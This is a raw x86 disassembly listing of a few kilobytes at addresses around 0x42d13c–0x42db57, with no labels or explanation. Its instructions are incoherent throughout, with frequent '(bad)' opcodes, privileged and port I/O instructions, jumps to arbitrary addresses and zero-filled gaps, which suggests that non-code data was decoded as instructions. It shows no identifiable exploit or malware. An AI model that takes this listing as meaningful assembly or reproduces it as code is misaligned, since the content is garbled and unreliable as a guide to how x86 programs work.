  42d13c:	pop    ecx
  42d13d:	icebp  
  42d13e:	(bad)  
  42d13f:	adc    eax,0x0
	...
  42d15c:	add    BYTE PTR [eax],al
  42d15e:	or     eax,0x96003fa8
  42d163:	rcl    DWORD PTR [edi],cl
  42d165:	fmul   QWORD PTR [esi-0x27]
  42d168:	or     al,0x81
  42d16a:	add    eax,ebx
  42d16c:	(bad)  
  42d16d:	jmp    DWORD PTR [eax]
  42d16f:	add    BYTE PTR [eax],al
  42d171:	aaa    
  42d172:	aas    
  42d173:	pop    gs
  42d175:	xor    edi,DWORD PTR ds:0x57aed630
  42d17b:	out    0xac,eax
  42d17d:	inc    esi
  42d17e:	or     eax,0x86d14fd8
  42d183:	ret    0xc3b6
  42d186:	xlat   BYTE PTR ds:[ebx]
  42d187:	aas    
  42d188:	push   cs
  42d189:	(bad)  
  42d18a:	jmp    0x42d188
  42d18c:	imul   esi,eax,0x3a8ee1e
  42d192:	xor    al,al
  42d194:	es retf 0xdc30
  42d198:	std    
  42d199:	inc    ebx
  42d19a:	or     eax,0x6723e4ca
  42d19f:	ds jmp 0xae8eaea4
  42d1a5:	fild   DWORD PTR [eax]
  42d1a7:	mov    edx,0xbf8903e9
  42d1ac:	mov    ch,0x45
  42d1ae:	es in  al,dx
  42d1b0:	call   0x6e42b4a9
  42d1b5:	clc    
  42d1b6:	repnz mov ds:0x80d403a6,eax
  42d1bc:	fld    QWORD PTR [ecx*1+0x217c00]
	...
  42d1df:	add    BYTE PTR [edx+0xd04f18f],cl
  42d1e5:	add    BYTE PTR [ecx+edx*8+0x79],ch
  42d1e9:	and    BYTE PTR [ebx-0x21fff36],dl
  42d1ef:	inc    ebx
  42d1f0:	or     eax,0x4fa97b
  42d1f5:	sub    eax,0xd3d3439
  42d1fa:	scas   al,BYTE PTR es:[edi]
  42d1fb:	mov    ah,BYTE PTR ds:0xb50426a4
  42d201:	cmp    DWORD PTR [ebx+0x25b6c9],esi
  42d207:	cli    
  42d208:	into   
  42d209:	es mov edi,0xbf26cf62
  42d20f:	inc    edi
  42d210:	aam    0x1b
  42d212:	cld    
  42d213:	cli    
  42d214:	dec    esi
  42d215:	add    BYTE PTR [edi+0x15],bh
  42d218:	in     eax,dx
  42d219:	sti    
  42d21a:	call   DWORD PTR [esi+edx*1]
  42d21d:	inc    ecx
  42d21e:	jl     0x42d1ed
  42d220:	add    dh,0x74
  42d223:	mov    ebx,0xc774cdfb
  42d228:	pop    esp
  42d229:	sti    
  42d22a:	pop    ds
  42d22b:	(bad)  
  42d22c:	sar    bh,1
  42d22e:	add    ebx,ebp
  42d230:	add    ebx,eax
  42d232:	enter  0x1124,0x0
  42d236:	test   BYTE PTR [ecx],ch
  42d238:	mov    ebp,0x7501a0e3
  42d23d:	add    DWORD PTR [eax],eax
  42d23f:	jb     0x42d1ca
  42d241:	add    BYTE PTR [ecx],al
  42d243:	jmp    0x42d248
	...
  42d260:	add    BYTE PTR [eax],al
  42d262:	push   cs
  42d263:	ja     0x42d2a7
  42d265:	(bad)  [edi+0x18]
  42d268:	fsubr  QWORD PTR [edx-0x127f86f2]
  42d26e:	sldt   WORD PTR [eax]
  42d271:	jo     0x42d242
  42d273:	out    0xbd,eax
  42d275:	in     eax,dx
  42d276:	push   cs
  42d277:	xchg   DWORD PTR cs:[ebp+0x652f82a],edx
  42d27e:	pop    ebp
  42d27f:	sbb    al,0x18
  42d281:	dec    BYTE PTR [edx+0x1c]
  42d284:	sbb    dh,dh
  42d286:	inc    edx
  42d287:	sbb    al,0x18
  42d289:	xchg   edi,eax
  42d28a:	aad    0xea
  42d28c:	jecxz  0x42d288
  42d28e:	dec    esi
  42d28f:	add    BYTE PTR [edi-0x6327e21f],al
  42d295:	(bad)  
  42d296:	(bad)
  42d299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d29a:	cmc    
  42d29b:	and    eax,0xfce400be
  42d2a0:	dec    ebp
  42d2a1:	mov    eax,DWORD PTR [eax]
  42d2a3:	and    BYTE PTR [eax],cl
  42d2a5:	push   edi
  42d2a6:	jnp    0x42d2d8
  42d2a8:	and    al,0x18
  42d2aa:	jnp    0x42d2dc
  42d2ac:	and    al,0x18
  42d2ae:	imul   esi,DWORD PTR [eax],0x24
  42d2b1:	sbb    dl,ah
  42d2b3:	mov    dh,0x15
  42d2b5:	fcom   QWORD PTR [edi-0x6374ffc4]
  42d2bb:	psubsb mm6,QWORD PTR [ebx+ecx*4-0x49]
  42d2c0:	test   DWORD PTR [ebx-0x3da9e84d],0x0
	...
  42d2e2:	add    BYTE PTR [eax],al
  42d2e4:	push   esp
  42d2e5:	cld    
  42d2e6:	push   esp
  42d2e7:	mov    ebp,eax
  42d2e9:	push   cs
  42d2ea:	xor    DWORD PTR [ebp+0x5c],0xf
  42d2ee:	div    DWORD PTR [ebp+0xc]
  42d2f1:	mov    bh,0x75
  42d2f3:	adc    al,0xbb
  42d2f5:	xor    DWORD PTR [eax],edx
  42d2f7:	jmp    DWORD PTR [ecx-0x38]
  42d2fa:	push   ecx
  42d2fb:	jmp    DWORD PTR [ecx+0x68]
  42d2fe:	adc    al,0x40
  42d300:	and    al,0x43
  42d302:	clc    
  42d303:	push   edi
  42d304:	int3   
  42d305:	add    dh,bh
  42d307:	(bad)  
  42d308:	sti    
  42d309:	inc    ebx
  42d30a:	mov    edi,0xba194a5f
  42d30f:	adc    al,0x24
  42d311:	adc    DWORD PTR [ebx+0x754352ec],eax
  42d317:	or     bl,al
  42d319:	enter  0x1875,0xb
  42d31d:	dec    esi
  42d31e:	adc    al,0xff
  42d320:	xor    DWORD PTR [ebx-0xe178a0a],0xaf0015f6
  42d32a:	cmp    eax,DWORD PTR [eax]
  42d32c:	pop    edi
  42d32d:	int3   
  42d32e:	dec    edi
  42d32f:	call   0x3a9a0f
  42d334:	or     eax,0x6b5bbb22
  42d339:	in     al,dx
  42d33a:	mov    ebp,0x771c0d14
  42d33f:	in     al,dx
  42d340:	pop    esi
  42d341:	mov    edx,0xf4ce37a6
  42d346:	xrelease xchg BYTE PTR [eax],al
	...
  42d365:	add    BYTE PTR [eax-0x23],bl
  42d368:	xlat   BYTE PTR ds:[ebx]
  42d369:	fsubp  st(7),st
  42d36b:	test   al,0xff
  42d36d:	ss into 
  42d36f:	sbb    al,0x0
  42d371:	das    
  42d372:	int    0x82
  42d374:	sbb    BYTE PTR [edi-0x22],cl
  42d377:	lea    edx,[ecx+0x10]
  42d37a:	fistp  DWORD PTR [eax]
  42d37c:	ret    
  42d37d:	jne    0x42d388
  42d37f:	sbb    al,bl
  42d381:	jne    0x42d388
  42d383:	ss icebp 
  42d385:	addr16 cld 
  42d387:	call   0xa7910a8f
  42d38c:	fstp   TBYTE PTR [ecx]
  42d38e:	mov    eax,0x800b45b8
  42d393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d394:	(bad)  
  42d397:	dec    ebp
  42d398:	push   eax
  42d399:	add    eax,DWORD PTR [esi]
  42d39b:	ins    BYTE PTR es:[edi],dx
  42d39c:	out    dx,eax
  42d39d:	jl     0x42d3fe
  42d39f:	xor    ebp,ebp
  42d3a1:	push   esi
  42d3a2:	shr    dl,1
  42d3a4:	idiv   edi
  42d3a6:	shl    DWORD PTR [ecx],0xd8
  42d3a9:	xchg   eax,ecx
  42d3ab:	mov    eax,0xa8a7532d
  42d3b0:	ret    0x175
  42d3b3:	fcmove st,st(5)
  42d3b5:	sti    
  42d3b6:	and    BYTE PTR [ecx+0x6029ad7],0xc3
  42d3bd:	xchg   ebp,esi
  42d3bf:	and    eax,ebx
  42d3c1:	jnp    0x42d3cc
  42d3c3:	jp     0x42d384
  42d3c5:	out    0x27,eax
  42d3c7:	data16 sub ch,al
	...
  42d3e6:	add    BYTE PTR [eax],al
  42d3e8:	and    DWORD PTR [eax],eax
  42d3ea:	aas    
  42d3eb:	add    al,0xd
  42d3ed:	mov    ebx,ecx
  42d3ef:	sbb    bh,0x33
  42d3f2:	ret    0x507a
  42d3f5:	adc    BYTE PTR [esi],dh
  42d3f7:	das    
  42d3f8:	(bad)  
  42d3f9:	xor    al,0xf5
  42d3fb:	js     0x42d453
  42d3fd:	mov    edi,0xa80550ba
  42d402:	cmp    eax,0xeebea6c7
  42d407:	ret    0xa19
  42d40a:	cmp    ebx,esp
  42d40c:	aam    0x59
  42d40e:	jmp    0x7f02b616
  42d413:	cli    
  42d414:	xchg   ebx,eax
  42d415:	inc    esp
  42d416:	cmc    
  42d417:	or     BYTE PTR [ebp+0x33],0xe7
  42d41b:	jl     0x42d432
  42d41d:	mov    esp,DWORD PTR [ebx+0x145dd62a]
  42d423:	ret    0xfffd
  42d426:	pop    ss
  42d427:	fsub   QWORD PTR [eax+0x58]
  42d42a:	jmp    0x51936e32
  42d42f:	in     eax,dx
  42d430:	mov    eax,0xe0c2e8ff
  42d435:	mov    bh,BYTE PTR ds:0x6c55d234
  42d43b:	mov    al,0xe1
  42d43e:	cmc    
  42d43f:	stos   BYTE PTR es:[edi],al
  42d440:	loop   0x42d3f7
  42d442:	pop    esi
  42d443:	inc    eax
  42d444:	adc    eax,0x98c69656
  42d449:	mov    cr2,eax
	...
  42d468:	add    BYTE PTR [eax],al
  42d46a:	or     DWORD PTR [eax-0x41e858fa],ebp
  42d470:	pop    esi
  42d471:	rcl    DWORD PTR [eax+0x520e90b6],cl
  42d477:	test   al,0xe
  42d479:	sub    al,0xd
  42d47b:	add    BYTE PTR [esi],cl
  42d47d:	adc    BYTE PTR [edx+0x44e10043],cl
  42d483:	mov    esi,0x55ca748c
  42d488:	call   0x42f8b8
  42d48d:	fs leave 
  42d48f:	xor    esp,DWORD PTR ds:0x42bc5a62
  42d495:	inc    edx
  42d496:	sar    DWORD PTR [ebp-0x5f31507a],cl
  42d49c:	(bad)  
  42d49d:	sbb    cl,dl
  42d49f:	arpl   WORD PTR [ecx-0x17],bx
  42d4a2:	push   cs
  42d4a3:	test   eax,ebx
  42d4a5:	fs je  0x42d4db
  42d4a8:	mov    eax,0xe758c713
  42d4ad:	icebp  
  42d4ae:	adc    edi,DWORD PTR [ecx+0x1907eb74]
  42d4b4:	xchg   DWORD PTR [edi-0x5436aad5],esp
  42d4ba:	jne    0x42d479
  42d4bc:	push   esp
  42d4bd:	jb     0x42d514
  42d4bf:	cmp    eax,0xac8e71e4
  42d4c4:	nop
  42d4c5:	call   0xedcfd4d8
  42d4ca:	cli    
  42d4cb:	dec    edi
  42d4cc:	push   0xeb
	...
  42d4e9:	add    BYTE PTR [eax],al
  42d4eb:	add    BYTE PTR [eax+eax*1],cl
  42d4ee:	add    BYTE PTR [esi+0x3a],dl
  42d4f1:	aad    0x15
  42d4f3:	test   eax,0xe2d8b10e
  42d4f8:	dec    esi
  42d4f9:	inc    eax
  42d4fa:	xchg   DWORD PTR [edx+ebp*8+0x7c],eax
  42d4fe:	sti    
  42d4ff:	or     al,0x35
  42d501:	cmovo  ebp,ecx
  42d504:	popa   
  42d505:	add    ch,BYTE PTR [eax+0x7fffd173]
  42d50b:	fsub   QWORD PTR [esi-0x25]
  42d50e:	aas    
  42d50f:	jmp    0xb67b0822
  42d514:	mov    DWORD PTR [edi],eax
  42d516:	fiadd  DWORD PTR [eax]
  42d518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d519:	add    BYTE PTR [edi-0x1],cl
  42d51c:	fldcw  WORD PTR [eax-0x7f0bbff3]
  42d522:	cmp    eax,0x3f11d8
  42d527:	add    BYTE PTR [ecx],bh
  42d529:	stos   BYTE PTR es:[edi],al
  42d52a:	jecxz  0x42d4d8
  42d52c:	mov    bl,0xc3
  42d52e:	test   DWORD PTR [esp+esi*2-0x5638eeb4],0xa443dd64
  42d539:	push   ebx
  42d53a:	pop    ds
  42d53b:	inc    edx
  42d53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d53d:	jp     0x42d544
  42d53f:	fadd   DWORD PTR [ecx-0x4feffc1]
  42d545:	ret    0x1c15
  42d548:	xchg   esi,eax
  42d549:	inc    eax
  42d54a:	add    BYTE PTR [edi+0x1e],bl
  42d54d:	std    
  42d54e:	and    eax,DWORD PTR [eax+eax*1]
	...
  42d56d:	add    bh,dh
  42d56f:	repnz add edi,edi
  42d572:	neg    DWORD PTR [edx+0x8]
  42d575:	add    ah,bh
  42d577:	cli    
  42d578:	or     ecx,DWORD PTR [edx-0x77f81fd8]
  42d57e:	cmp    dh,BYTE PTR [ebp-0x4749397e]
  42d584:	sti    
  42d585:	push   ebp
  42d586:	(bad)  
  42d588:	call   0x433a6b
  42d58d:	idiv   BYTE PTR [eax+0x1c]
  42d590:	or     BYTE PTR [ecx],al
  42d592:	pop    eax
  42d593:	mov    edx,0xe93fe851
  42d598:	(bad)  
  42d599:	(bad)  
  42d59a:	mov    edi,0x38c2567a
  42d59f:	add    BYTE PTR [ebp-0x75],dl
  42d5a2:	loopne 0x42d525
  42d5a4:	in     al,dx
  42d5a5:	js     0x42d5cc
  42d5a7:	add    BYTE PTR [eax],al
  42d5a9:	(bad)  
  42d5aa:	sub    bl,BYTE PTR [eax-0x56f2bf7e]
  42d5b0:	jg     0x42d5ef
  42d5b2:	in     eax,0xec
  42d5b4:	aas    
  42d5b5:	add    BYTE PTR ds:0xb2324a9a,cl
  42d5bb:	mov    cl,0xa5
  42d5bd:	aas    
  42d5be:	or     eax,0x515c49a
  42d5c3:	xlat   BYTE PTR ds:[ebx]
  42d5c4:	aas    
  42d5c5:	add    BYTE PTR [ebp+0x4edddbe4],cl
  42d5cb:	test   eax,0xc12774ff
  42d5d0:	out    0xfa,al
	...
  42d5ee:	add    BYTE PTR [eax],al
  42d5f0:	ret    0x88ca
  42d5f3:	rol    BYTE PTR [ecx-0x28],0xc6
  42d5f7:	add    eax,0x439cd1
  42d5fc:	cmp    cl,BYTE PTR [edx]
  42d5fe:	inc    edx
  42d5ff:	add    bl,cl
  42d601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d602:	xlat   BYTE PTR ds:[ebx]
  42d603:	fisttp QWORD PTR [esi-0x57]
  42d606:	add    al,0x53
  42d608:	xchg   edx,eax
  42d609:	mov    ah,0x1b
  42d60b:	push   cs
  42d60c:	int    0xa8
  42d60e:	nop
  42d60f:	inc    ebp
  42d610:	cmp    ecx,0x83858590
  42d616:	mov    edi,0x810ddfb
  42d61b:	and    BYTE PTR ds:0x62fb27a9,cl
  42d621:	test   eax,0xb0e0faff
  42d626:	jle    0x42d69c
  42d628:	or     al,0xa9
  42d62a:	dec    DWORD PTR [eax+0x15bf54c8]
  42d630:	sbb    eax,0x90003fb3
  42d635:	jmp    0x2c1ce571
  42d63a:	mov    DWORD PTR [eax+0x66bef22b],ecx
  42d640:	or     eax,0xbd15be99
  42d645:	(bad)  
  42d646:	cli    
  42d647:	inc    ebx
  42d648:	or     eax,0x8a10257f
  42d64d:	jge    0x42d65c
  42d64f:	ret    0xbb06
  42d652:	jecxz  0x42d6b6
	...
  42d670:	add    BYTE PTR [eax],al
  42d672:	or     DWORD PTR [edi],0xb9e98166
  42d678:	cli    
  42d679:	ret    0xafc
  42d67c:	pop    esp
  42d67d:	(bad)  
  42d67e:	out    0xc7,eax
  42d680:	lds    eax,FWORD PTR ds:0xaef44185
  42d686:	or     edx,eax
  42d688:	and    edx,DWORD PTR [ecx]
  42d68a:	or     al,0x87
  42d68c:	ins    BYTE PTR es:[edi],dx
  42d68d:	xlat   BYTE PTR ds:[ebx]
  42d68e:	(bad)  
  42d68f:	mov    edx,0x72abca
  42d694:	jmp    0xf165089c
  42d699:	add    edx,DWORD PTR [ebp+0x488ee541]
  42d69f:	or     BYTE PTR [eax+0x49],ah
  42d6a2:	adc    DWORD PTR [edi+0x353ccab],eax
  42d6a8:	jmp    0xaaf36906
  42d6ad:	add    al,0xb5
  42d6af:	test   DWORD PTR [ecx],ebp
  42d6b1:	add    al,0x65
  42d6b3:	sub    cl,0x3
  42d6b6:	or     eax,0xe786a65a
  42d6bb:	add    esi,DWORD PTR [edx+0x37]
  42d6be:	bound  ebp,QWORD PTR [edx-0x18]
  42d6c1:	mov    BYTE PTR [esi],0x72
  42d6c4:	stos   DWORD PTR es:[edi],eax
  42d6c5:	adc    ch,al
  42d6c7:	xor    ebp,esp
  42d6c9:	dec    ebx
  42d6ca:	sar    esi,0x16
  42d6cd:	les    eax,FWORD PTR [edx-0x4ca318db]
  42d6d3:	adc    BYTE PTR [esi+0x8],cl
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	loop   0x42d6be
  42d6f6:	test   al,0x2d
  42d6f8:	jbe    0x525585fe
  42d6fe:	call   0x42e8a3
  42d703:	mov    ebx,0xf4fb4fb9
  42d708:	test   BYTE PTR [edi],0x40
  42d70b:	jmp    0x11c2a00b
  42d710:	iret   
  42d711:	xchg   DWORD PTR [edx-0x13],eax
  42d714:	pop    ds
  42d715:	xchg   ebx,eax
  42d716:	shr    BYTE PTR [edx],0x93
  42d719:	ss or  cl,ch
  42d71c:	sbb    bh,ch
  42d71e:	cmp    BYTE PTR [edi-0x2],ch
  42d721:	add    al,0x94
  42d723:	test   eax,0xed15b5c8
  42d728:	and    al,0x40
  42d72a:	add    BYTE PTR [eax+0x57],ah
  42d72d:	or     BYTE PTR [ebp+0x5319f5a9],al
  42d733:	sbb    esp,ecx
  42d735:	cs add al,0xbe
  42d738:	add    al,BYTE PTR [edx+edx*1]
  42d73b:	sub    DWORD PTR [ecx],ecx
  42d73d:	add    eax,0x34
  42d740:	pop    es
  42d741:	xchg   DWORD PTR [edx-0x7],edi
  42d744:	push   ds
  42d745:	(bad)  
  42d746:	mov    esi,0xfb08479e
  42d74b:	cld    
  42d74c:	(bad)  
  42d74d:	adc    eax,DWORD PTR [eax-0x17]
  42d750:	xchg   ecx,eax
  42d751:	push   ds
  42d752:	or     cl,ch
  42d754:	js     0x42d7cf
  42d756:	mov    edi,0x72
	...
  42d773:	add    BYTE PTR [eax],al
  42d775:	add    bh,dl
  42d777:	add    edi,DWORD PTR [edi+0x71]
  42d77a:	dec    esp
  42d77b:	xor    al,0x12
  42d77d:	add    edx,DWORD PTR [ebx]
  42d77f:	push   eax
  42d780:	sti    
  42d781:	cld    
  42d782:	test   BYTE PTR ds:0x2e4de940,0x4
  42d789:	push   esi
  42d78a:	sbb    dh,ah
  42d78c:	adc    DWORD PTR [ecx+0x4a390e],ebp
  42d792:	and    al,al
  42d794:	add    DWORD PTR [esi+0x1c],0xffffff82
  42d798:	shl    BYTE PTR [edi+ebp*1+0x4d],0xf7
  42d79d:	adc    eax,0x4010dc
  42d7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7a3:	in     eax,0x7
  42d7a5:	add    BYTE PTR [edi],dh
  42d7a7:	push   ecx
  42d7a8:	sub    esp,0x77
  42d7ab:	jo     0x42d7f9
  42d7ad:	push   esi
  42d7ae:	outs   dx,DWORD PTR ds:[esi]
  42d7af:	je     0x42d813
  42d7b1:	add    DWORD PTR [ebx],ecx
  42d7b3:	test   BYTE PTR [ebx],0xff
  42d7b6:	rcl    DWORD PTR [esi+ecx*1],0x40
  42d7ba:	hlt    
  42d7bb:	add    eax,0xfe8b8375
  42d7c1:	imul   eax,DWORD PTR [ecx+ecx*4],0x8b05e04d
  42d7c8:	(bad)  
  42d7c9:	inc    DWORD PTR [eax+ecx*1]
  42d7cc:	test   eax,eax
  42d7ce:	dec    ebx
  42d7cf:	outs   dx,DWORD PTR ds:[esi]
  42d7d0:	je     0x42d81d
  42d7d2:	retf   
  42d7d3:	adc    esp,ecx
  42d7d5:	adc    eax,0x333d03f4
	...
  42d7f6:	add    BYTE PTR [eax],al
  42d7f8:	adc    eax,DWORD PTR [eax+eax*1]
  42d7fb:	jne    0x42d7a0
  42d7fd:	in     al,0xf
  42d7ff:	daa    
  42d800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d801:	cld    
  42d802:	mov    WORD PTR [ebp-0x20],es
  42d805:	dec    esp
  42d806:	add    DWORD PTR [ebp+0x6c],0xffffffea
  42d80a:	and    al,ch
  42d80c:	sbb    BYTE PTR [ecx],al
  42d80e:	add    BYTE PTR [eax],al
  42d810:	loope  0x42d7ce
  42d812:	jne    0x42d834
  42d814:	loop   0x42d857
  42d816:	mov    ah,0x20
  42d818:	pusha  
  42d819:	add    DWORD PTR [ecx],edi
  42d81b:	inc    ebp
  42d81c:	js     0x42d80f
  42d81e:	pop    ds
  42d81f:	mul    BYTE PTR [ecx+0x6c740130]
  42d825:	cmp    DWORD PTR [ebp-0x48],0xd
  42d829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d82a:	xor    ebp,DWORD PTR [esi-0x4882cc6]
  42d830:	sbb    BYTE PTR [edi-0x4af2bfe7],dh
  42d836:	mov    edi,0x2e4545a
  42d83b:	add    BYTE PTR [ebp-0x59],bl
  42d83e:	lods   al,BYTE PTR ds:[esi]
  42d83f:	repz adc bl,BYTE PTR [ebx+0x6cf7e7cb]
  42d846:	mov    esp,gs
  42d848:	mov    ebp,?
  42d84a:	add    DWORD PTR ss:0xf1458aa9,ecx
  42d851:	cdq    
  42d852:	mov    al,BYTE PTR [ebp-0x444486b]
  42d858:	cmp    eax,0x200381
	...
  42d879:	add    BYTE PTR ds:0xd2fb27a9,cl
  42d87f:	test   eax,0xb140faff
  42d884:	ret    0xc145
  42d887:	push   ebp
  42d888:	add    eax,0x19c60d00
  42d88d:	adc    BYTE PTR [ebx],bl
  42d88f:	jmp    0xed105d97
  42d894:	adc    BYTE PTR [edi-0x4456a78],al
  42d89a:	call   0xa6a9:0xd0020c1
  42d8a1:	(bad)  
  42d8a2:	cmp    al,0x69
  42d8a4:	int    0xbe
  42d8a6:	or     DWORD PTR [ecx-0x1eb24df6],ebp
  42d8ac:	aaa    
  42d8ad:	push   es
  42d8ae:	lds    esi,FWORD PTR [esi+edi*8+0x266a4d2e]
  42d8b5:	adc    eax,ebp
  42d8b7:	imul   esp,DWORD PTR [esi],0x4c69c2fe
  42d8bd:	dec    eax
  42d8be:	fcos   
  42d8c0:	in     eax,dx
  42d8c1:	xor    BYTE PTR ds:0xf302d50d,0xbf
  42d8c8:	es je  0x42d906
  42d8cb:	ret    0x599
  42d8ce:	jb     0x42d8d7
  42d8d0:	jnp    0x42d916
  42d8d2:	sbb    DWORD PTR [eax-0x4b],ecx
  42d8d5:	or     ebp,edx
  42d8d7:	sub    esp,esi
  42d8d9:	repnz pop edx
  42d8db:	ret    
  42d8dc:	mov    edi,0x1f
	...
  42d8f9:	add    BYTE PTR [eax],al
  42d8fb:	add    BYTE PTR [ebp+0x65138fc2],dh
  42d901:	ret    
  42d902:	jmp    0x937:0xa1480d76
  42d909:	add    DWORD PTR [ecx],0x19
  42d90c:	jns    0x42d911
  42d90e:	mov    dh,0xc3
  42d910:	stos   BYTE PTR es:[edi],al
  42d911:	sub    ebp,ebx
  42d913:	pop    ebx
  42d914:	mov    ds:0x9a5bd929,al
  42d919:	dec    esp
  42d91a:	pop    esi
  42d91b:	mov    al,0x3c
  42d91d:	mov    ebp,DWORD PTR [ebx-0x25492b55]
  42d923:	mov    esi,0xbee92a5d
  42d928:	inc    eax
  42d929:	or     BYTE PTR [eax+0x48],ah
  42d92c:	mov    cl,0xb6
  42d92e:	fcom   QWORD PTR [ebx-0x1]
  42d931:	aas    
  42d932:	jmp    0x6446a2b9
  42d937:	dec    eax
  42d938:	cdq    
  42d939:	dec    edi
  42d93a:	stos   BYTE PTR es:[edi],al
  42d93b:	cmp    BYTE PTR ds:0x86081bb7,al
  42d941:	or     al,0x85
  42d943:	sbb    ch,cl
  42d945:	call   FWORD PTR [ecx+0x29c022db]
  42d94b:	int    0xb3
  42d94d:	sti    
  42d94e:	call   0x18e66bab
  42d953:	mov    ecx,DWORD PTR [edi-0x59]
  42d956:	add    BYTE PTR [edx-0x65],bl
  42d959:	mov    edx,0x2719fb
  42d95e:	sti    
  42d95f:	fadd   QWORD PTR [eax]
	...
  42d97d:	add    BYTE PTR [esi],dl
  42d97f:	mov    DWORD PTR [ebp+0x5d],eax
  42d982:	or     DWORD PTR [eax+edx*2],0xffffffff
  42d986:	into   
  42d987:	(bad)  
  42d988:	jle    0x42d9af
  42d98a:	add    al,BYTE PTR [ebp-0x4541babb]
  42d990:	jne    0x42d983
  42d992:	arpl   WORD PTR [ecx],si
  42d994:	add    al,0x36
  42d996:	cmc    
  42d997:	mov    ds:0xb30ea915,eax
  42d99c:	fadd   DWORD PTR [edx]
  42d99e:	rol    DWORD PTR [eax-0x37],1
  42d9a1:	sub    ecx,DWORD PTR [edx]
  42d9a3:	add    bl,bh
  42d9a5:	popf   
  42d9a6:	repnz add ebx,edi
  42d9a9:	cdq    
  42d9aa:	push   es
  42d9ab:	mov    ecx,0xbabed70
  42d9b0:	add    bh,dl
  42d9b2:	dec    esi
  42d9b3:	add    bl,dh
  42d9b5:	adc    edi,esi
  42d9b7:	mov    edi,0xa2b40
  42d9bc:	push   ebp
  42d9bd:	jb     0x42da3c
  42d9bf:	xor    eax,0x525c19ec
  42d9c4:	push   ebx
  42d9c5:	bound  edi,QWORD PTR [esi+0x7d]
  42d9c8:	fadd   st,st(1)
  42d9ca:	and    eax,0x95c6fbb3
  42d9cf:	shl    BYTE PTR [edi+esi*8-0xc],0xe4
  42d9d4:	pop    edx
  42d9d5:	sar    DWORD PTR [ecx-0x7a51044d],0xc0
  42d9dc:	je     0x42d9b1
  42d9de:	sbb    DWORD PTR [ecx-0x1],esi
  42d9e1:	imul   eax,DWORD PTR [eax],0x0
	...
  42d9ff:	add    cl,al
  42da01:	mov    dh,0x74
  42da03:	in     al,dx
  42da04:	and    al,0x10
  42da06:	pop    eax
  42da07:	add    BYTE PTR [ebx],0xe5
  42da0a:	enter  0xf700,0x73
  42da0e:	(bad)  
  42da0f:	ud1    eax,eax
  42da12:	lea    eax,[ecx-0x1d]
  42da15:	jle    0x42d9f7
  42da17:	sbb    al,0xf4
  42da19:	dec    esi
  42da1a:	div    DWORD PTR [esi+0x38]
  42da1d:	je     0x42da34
  42da1f:	fdivr  QWORD PTR [ecx]
  42da21:	inc    ecx
  42da22:	add    BYTE PTR [ebp-0x74de081c],al
  42da28:	add    eax,edx
  42da2a:	adc    eax,0xcf743440
  42da2f:	mov    ebx,0xfffb9c27
  42da34:	lods   eax,DWORD PTR ds:[esi]
  42da35:	cmp    al,0xfc
  42da37:	cmp    esp,edi
  42da39:	test   DWORD PTR ds:0xf77544e8,0xfbed23ff
  42da43:	(bad)  
  42da44:	stc    
  42da45:	mov    al,0x11
  42da47:	inc    eax
  42da48:	in     al,0x73
  42da4a:	iret   
  42da4b:	cmp    esi,DWORD PTR [edi]
  42da4d:	in     eax,dx
  42da4e:	sub    ebx,ebp
  42da50:	fidiv  WORD PTR [eax]
  42da52:	add    ebx,ebp
  42da54:	shr    BYTE PTR [edx+0x45],cl
  42da57:	shl    BYTE PTR [ebp+ebp*8+0x469ff0e],1
  42da5e:	lea    eax,[ebp-0x7c]
  42da61:	push   eax
  42da62:	add    DWORD PTR [ebp+0x0],0x0
	...
  42da82:	mov    al,0xe6
  42da84:	psubsb mm6,mm0
  42da87:	(bad)  
  42da88:	(bad)  
  42da89:	(bad)  
  42da8a:	cmp    ecx,eax
  42da8c:	je     0x42da73
  42da8e:	mov    edi,0xc87d7b03
  42da93:	add    BYTE PTR [ecx+ebx*8+0x63],dh
  42da97:	in     eax,dx
  42da98:	jecxz  0x42da99
  42da9a:	mov    DWORD PTR [eax-0x518bbfef],esi
  42daa0:	mov    ebx,0x58ed0d5f
  42daa5:	leave  
  42daa6:	dec    edi
  42daa7:	sahf   
  42daa8:	call   DWORD PTR [ecx-0x6a]
  42daab:	ss lock mov edi,0x10ab48d
  42dab2:	ret    0x929d
  42dab5:	rol    BYTE PTR [eax+0x327fbcae],0xa3
  42dabc:	mov    bh,BYTE PTR [ebx+0xe]
  42dabf:	dec    edi
  42dac0:	stos   DWORD PTR es:[edi],eax
  42dac1:	cld    
  42dac2:	cmp    cl,BYTE PTR [ebp-0x7d]
  42dac5:	sar    BYTE PTR [ecx+0x281fa792],0x3d
  42dacc:	mov    esp,0x406a4d84
  42dad1:	or     esp,DWORD PTR [edx-0x57]
  42dad4:	cmp    al,0xf
  42dad7:	ins    BYTE PTR es:[edi],dx
  42dad8:	add    ah,BYTE PTR [esi+0x1d]
  42dadb:	shr    DWORD PTR [eax+0x7ff03e0a],0xf8
  42dae2:	and    bl,BYTE PTR [edx+0xc192]
	...
  42db04:	sub    BYTE PTR [eax-0x44],0x7f
  42db08:	in     eax,dx
  42db09:	popf   
  42db0a:	dec    edi
  42db0b:	dec    edi
  42db0c:	loop   0x42db39
  42db0e:	add    edi,ebx
  42db10:	add    ch,al
  42db12:	adc    eax,0xbf1c0d40
  42db17:	jne    0x42db3d
  42db19:	sub    DWORD PTR [esi],esi
  42db1b:	or     eax,0x66074c0c
  42db20:	and    edx,ecx
  42db22:	cs add al,0xb2
  42db25:	lods   al,BYTE PTR ds:[esi]
  42db26:	repz adc DWORD PTR [ebp-0x57],ecx
  42db2a:	add    al,0x18
  42db2d:	popf   
  42db2e:	outs   dx,DWORD PTR ds:[esi]
  42db2f:	add    DWORD PTR [esi-0x3eea492d],esp
  42db35:	int3   
  42db36:	aas    
  42db37:	add    BYTE PTR [esi+0x17aca100],dl
  42db3d:	mov    ch,0x9a
  42db3f:	mov    ebx,0xf3fcb2de
  42db44:	sbb    al,0x40
  42db46:	jmp    0x23968640
  42db4b:	(bad)  
  42db4c:	mov    eax,0x69858d86
  42db51:	nop
  42db52:	jmp    0xff91e85a
  42db57:	cmp    DWORD PTR [eax+0x46badb7d],ebx
